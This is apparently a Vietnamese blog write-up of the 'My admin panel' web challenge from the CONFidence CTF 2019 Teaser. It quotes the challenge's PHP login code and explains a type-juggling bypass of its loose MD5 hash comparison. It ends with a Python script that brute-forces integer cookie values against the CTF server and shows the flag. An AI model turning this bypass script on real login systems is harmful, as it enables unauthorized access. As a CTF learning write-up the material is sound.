---
layout: post
title: CONFidence CTF 2019 Teaser
---
# CONFidence CTF 2019 Teaser
Giải do team p4 tổ chức, có khá nhiều bài hay :))) Nhưng là mới chỉ là Teaser thôi nên mình vẫn chưa ngập hành. 


![alt text](https://raw.githubusercontent.com/matuhn/matuhn.github.io/master/images/con1.png "CONFidence CTF 2019")

# My admin panel (Web)
[Link Challenge](https://gameserver.zajebistyc.tf/admin/)

Vào challenge mình thấy có ngay 2 file là login.php và login.php.bak (File Backup)

![alt text](https://raw.githubusercontent.com/matuhn/matuhn.github.io/master/images/con2.png "/admin")

Nội dung file index.php.bak

```PHP
<?php

include '../func.php';
include '../config.php';

if (!$_COOKIE['otadmin']) {
    exit("Not authenticated.\n");
}

if (!preg_match('/^{"hash": [0-9A-Z\"]+}$/', $_COOKIE['otadmin'])) {
    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
    exit();
}

$session_data = json_decode($_COOKIE['otadmin'], true);

if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }

if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
    echo("I CAN EVEN GIVE YOU A HINT XD \n");

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }

    exit("\n");
}

display_admin();
```

Đọc hiểu code thì nó sẽ lấy giá trị của cookie `otadmin` check xem có dạng /^{"hash": [0-9A-Z\"]+}$/ hay là không
Nói dễ hiểu hơn thì cookie sẽ phải có dạng json {"hash" : "abcxyz123jj"} thì pass cái if 1 và if 2 if 3
để pass cái if thứ 4 thì cái giá trị của hash khi parse vào phải bằng với giá trị của `strtoupper(MD5($cfg_pass))`

Nếu không thể pass if 4 nó sẽ gợi ý cho mình bằng function sau 

```PHP

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }
```

Output:

```
0 0 0 64 64 64 0 64 0 0 64 0 0 0 64 64 64 64 0 0 0 64 0 0 64 0 64 0 64 64 0 0
```

Sau 1 hồi nghịch ngợm với cái đống này thì mình phát hiện ra 1 điều 
Nếu `ord(MD5($cfg_pass)[$i])` return từ 0 - 63 thì `ord(MD5($cfg_pass)[$i]) & 0xC0` = 0
Còn lại thì sẽ ra 64, điều đó đồng nghĩa với việc với 1 mỗi 1 con số từ 0-9 -> sẽ có 1 số 0 
và nếu là kí tự , thì sẽ có số 64 
So sánh với Output ở trên mình sẽ có 3 giá trị đầu tiên là number , và giá trị thứ 4 là character 

Tất nhiên là không thể brute được cái cfg_pass là gì, làm gì có cái mùa xuân đó, nếu brute được thì chắc mất cả năm 
Nên mình nhìn lại toàn bộ source code 1 lần nữa thì dòng này khiến cho mình chú ý 

```PHP
if ($session_data['hash'] != strtoupper(MD5($cfg_pass)))
```

Tại sao là `!=` chứ không phải là `!==` ? PHP Type Juggling ? Trùng hợp là 3 kí tự đầu tiên lại là number 
Chắc chắn là Type Juggling 

Solution: 

```python
import requests,json
def bruteCookie(i):
    url = "https://gameserver.zajebistyc.tf/admin/login.php"
    cookie = json.dumps({
        "hash" : (i)
    })
    cookie = {"otadmin" : cookie}
    print (cookie)
    answer = requests.get(url,cookies=cookie)
    if not "I CAN EVEN " in answer.text:

        print answer.text


for i in range(1,999):
    bruteCookie(i)
```

Flag : `p4{wtf_php_comparisons_how_do_they_work}`
